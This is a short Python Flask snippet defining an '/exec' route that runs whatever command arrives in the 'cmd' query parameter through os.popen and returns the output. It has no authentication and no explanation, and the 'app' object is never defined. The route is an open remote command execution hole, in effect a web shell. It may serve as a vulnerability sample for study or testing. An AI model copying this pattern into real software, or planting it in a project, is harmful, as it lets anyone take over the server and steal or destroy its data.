import os
from flask import request

@app.route('/exec')
def exec_cmd():
    cmd = request.args.get("cmd")
    return os.popen(cmd).read()